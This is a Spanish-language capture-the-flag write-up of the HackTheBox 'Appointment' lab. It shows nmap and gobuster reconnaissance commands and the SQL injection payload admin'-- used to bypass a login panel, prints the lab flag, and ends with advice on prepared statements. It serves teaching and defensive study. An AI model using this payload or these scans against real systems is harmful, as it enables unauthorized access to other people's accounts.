---
layout: post
title: HTB — Appointment
date: 2026-05-31
platform: HackTheBox
difficulty: very-easy
description: SQL Injection en panel de login
tags:
  - SQLi
  - Linux
---

## Introducción

Appointment introduce **SQL Injection (SQLi)**, una de las vulnerabilidades más antiguas y prevalentes en aplicaciones web. El objetivo es un panel de login que construye su consulta SQL concatenando directamente el input del usuario — lo que permite manipular la lógica de autenticación sin conocer ninguna contraseña válida.

---

## Reconocimiento

Verificamos conectividad:

```bash
ping -c 1 10.129.x.x
# -c 1    Envía solo 1 paquete ICMP
```

Descubrimiento de puertos:

```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.129.x.x -oG allports
# -p-          Escanea los 65535 puertos
# -sS          SYN scan (sigiloso, no completa el handshake TCP)
# --open       Muestra solo puertos abiertos
# --min-rate   Envía mínimo 5000 paquetes por segundo
# -vvv         Verbose: muestra resultados en tiempo real
# -n           Sin resolución DNS (más rápido)
# -Pn          Omite el host discovery (asume que el host está activo)
# -oG          Guarda el output en formato Grepable
```

Output relevante:

```
PORT   STATE SERVICE
80/tcp open  http
```

Escaneo de versiones y scripts:

```bash
nmap -sCV -p80 10.129.x.x -oN target
# -sC      Ejecuta scripts de detección por defecto (NSE)
# -sV      Detecta versión del servicio
# -p80     Escanea solo el puerto 80
# -oN      Guarda el output en formato Normal (legible)
```

Output relevante:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 (Debian)
|_http-title: Login
```

---

## Enumeración web

Visito `http://10.129.x.x` — aparece un panel de login con campos de usuario y contraseña.

Enumero directorios en background mientras analizo el panel:

```bash
gobuster dir -u http://10.129.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o gobuster.txt
# dir      Modo enumeración de directorios
# -u       URL objetivo
# -w       Wordlist de rutas a probar
# -x       Extensiones a probar
# -o       Guarda el output en archivo
```

---

## Explotación — SQL Injection

El panel de login probablemente ejecuta una consulta SQL como esta internamente:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='INPUT';
```

Si el input no está sanitizado, puedo manipular la consulta. Pruebo el payload clásico de SQLi en el campo de usuario:

```
admin'--
```

Lo que hace este payload:
- `admin` → nombre de usuario a intentar
- `'` → cierra la comilla del string en la consulta SQL
- `--` → comenta el resto de la consulta (incluyendo el AND password)

La consulta resultante en el servidor es:

```sql
SELECT * FROM users WHERE username='admin'--' AND password='lo_que_sea';
```

Todo después de `--` es un comentario — la validación de contraseña desaparece. Si el usuario `admin` existe, entramos directamente.

```
Login successful.
```

---

## Flag

Una vez dentro del panel, la flag aparece en la página:

```
e3d0796d002a446c0e622226f42e9672
```

---

## ¿Qué aprendemos de esto?

**SQL Injection sigue siendo una de las vulnerabilidades más explotadas.** A pesar de tener décadas, sigue apareciendo en aplicaciones reales. El problema fundamental es concatenar input del usuario directamente en consultas SQL sin sanitizarlo.

**La solución son las consultas preparadas (prepared statements).** En lugar de construir la consulta con el input, se usa un placeholder que el motor de base de datos trata siempre como dato, nunca como código SQL.

**Un comentario SQL puede eliminar lógica de autenticación completa.** `--` en MySQL/MariaDB y `--` o `#` en otros motores comenta todo lo que sigue. Cualquier validación después del comentario deja de ejecutarse.

---

## Resumen técnico

| Elemento | Detalle |
|----------|---------|
| Puerto | 80/tcp (HTTP — Apache 2.4.38) |
| Vulnerabilidad | SQL Injection en campo de login |
| Payload | `admin'--` |
| Acceso obtenido | Bypass de autenticación |
| Herramientas | `nmap`, `gobuster` |
| Mitigación | Usar prepared statements, sanitizar input, implementar WAF |